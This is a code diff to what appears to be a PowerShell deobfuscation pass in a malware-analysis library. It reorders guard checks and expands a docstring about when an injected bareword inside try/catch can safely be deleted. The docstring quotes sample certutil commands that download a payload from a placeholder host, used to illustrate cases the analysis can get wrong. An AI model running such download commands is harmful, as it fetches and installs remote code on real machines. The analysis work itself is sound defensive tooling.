@@ -100,7 +100,8 @@ def _is_injected_noise_bareword(expr: Expression, cache: Ps1ModelCache) -> bool:
     so `try { certutil -urlcache -split -f http://host/payload.exe } catch { }` erased itself.
 
     The whole guess rests on the command table being the one the metadata describes, so it is only
-    made where the name is trustworthy at this very statement: `may_trust_command_name_at` below.
+    made where the name is trustworthy at this very statement:
+    `refinery.lib.scripts.ps1.analysis.worldflow.Ps1WorldReach.may_trust_command_name_at` below.
     A script that dot-sources a file, imports a module, defines an alias or runs `iex` can make any
     bareword resolve to real code, and only the redefinitions spelled as a `function` reach the
     shadow set — the world verdict the name-trust gate reads covers the rest, which is why the
@@ -116,24 +117,39 @@ def _is_injected_noise_bareword(expr: Expression, cache: Ps1ModelCache) -> bool:
     text running twice in one runspace. It is not any more: measured on 5.1, a block that carries
     such a bareword and rebinds the name at its end emits the handler's word on the first entry and
     the bareword's own residue on the second, so the second run does what the deletion says nothing
-    does. The transcript is the `& $s; & $s` row in `test.lib.scripts.ps1.corpus`, which is kept
-    from firing here only by the nesting refusal below — a block is not the root graph, so
-    `_position_in_root` places nothing in it. The forward flood behind the positional query is a
-    per-body one and carries no such edge, and
-    `refinery.lib.scripts.ps1.analysis.worldflow` refuses only the spellings a script names its own
-    path under. Where such a miss costs `values` and `effects` a wrongly deleted pure read, here it
-    costs a wrongly deleted command invocation with whatever arguments it carried.
+    does. The script measured is the `& $s; & $s` row in `test.lib.scripts.ps1.corpus`, whose
+    transcript `test.lib.scripts.ps1.test_oracle` takes from a host on every run; it is kept from
+    firing here only by the nesting refusal below — a block is not the root graph, so
+    `refinery.lib.scripts.ps1.analysis.worldflow.Ps1WorldReach._position_in_root` places nothing in
+    it. The forward flood behind the positional query is a per-body one and carries no such edge,
+    and `refinery.lib.scripts.ps1.analysis.worldflow` refuses only the spellings a script names its
+    own path under. Where such a miss costs `refinery.lib.scripts.ps1.analysis.values` and
+    `refinery.lib.scripts.ps1.analysis.effects` a wrongly deleted pure read, here it costs a wrongly
+    deleted command invocation with whatever arguments it carried.
 
     And the blocks the positional gate newly reaches stand, by construction, above a payload the
-    analysis could not read, so the `reads_the_error_record` refusal below does not cover them: a
-    payload that reads `$Error.Count` observes the removal, and no scan over text this cannot
-    decode can find that read. The guard is worth having for the scripts it does cover; these are
-    not among them.
+    analysis could not read, so the `Ps1CommandModel.reads_the_error_record` refusal below does not
+    cover them: a payload that reads `$Error.Count` observes the removal, and a scan over text can
+    only find that read where the passes have already folded it into one literal. Measured, the
+    text scan reaches a stored payload and misses one split across two strings or built out of
+    characters, and both of those come out of this pass with `$Error` standing in the output beside
+    the deleted statement that filled it. Those are wrong answers, pinned as such in
+    `test.lib.scripts.ps1.deobfuscation.test_removal_observability`; the guard is worth having for
+    the scripts it does cover, and these are not among them.
 
     What is then left between a leaking script and a deleted `certutil` is the `=` marker alone,
     where before there were two things. No native invocation is spelled `<name> =<one token>`, and
     that is the whole of the defence — which is why `_carries_assignment_marker` is written as
-    narrowly as it is.
+    narrowly as it is, and why the one shape it cannot tell apart from padding,
+    `try { certutil =http://host/payload.exe } catch { }` above a leak, is carried as a wrong answer
+    beside them rather than left unstated.
+
+    The name is rejected for a path separator, a program extension and a leading `.` or `~` before
+    the trust query rather than after it, because those spellings are not ones that query answers
+    about: `refinery.lib.scripts.ps1.ast.normalize_command_name`, which keys the shadow set, strips
+    a scope qualifier and not a module one, so a module-qualified spelling is looked up under a key
+    no `function` statement ever writes and would be granted on a name the script does redefine.
+    Both orders refuse the same spellings today; only this one refuses them for their own reason.
 
     The drop is also refused wherever the script can read the record the raise leaves behind, which
     is `Ps1CommandModel.reads_the_error_record`. A caught terminating error still fills `$Error`,
@@ -152,16 +168,18 @@ def _is_injected_noise_bareword(expr: Expression, cache: Ps1ModelCache) -> bool:
     name_lower = name.lower()
     if not _carries_assignment_marker(expr, name):
         return False
-    if cache.commands.reads_the_error_record():
-        return False
-    world = cache.world_reach
-    if name_lower in KNOWN_CMDLETS or not world.may_trust_command_name_at(name_lower, expr):
+    if name_lower in KNOWN_CMDLETS:
         return False
     if any(sep in name for sep in ('\\', '/', ':')):
         return False
     if any(name_lower.endswith(ext) for ext in _PATH_EXTENSIONS):
         return False
     if name.startswith('.') or name.startswith('~'):
+        return False
+    if cache.commands.reads_the_error_record():
+        return False
+    world = cache.world_reach
+    if not world.may_trust_command_name_at(name_lower, expr):
         return False
     for arg in expr.arguments:
         value = arg.value if isinstance(arg, Ps1CommandArgument) else arg
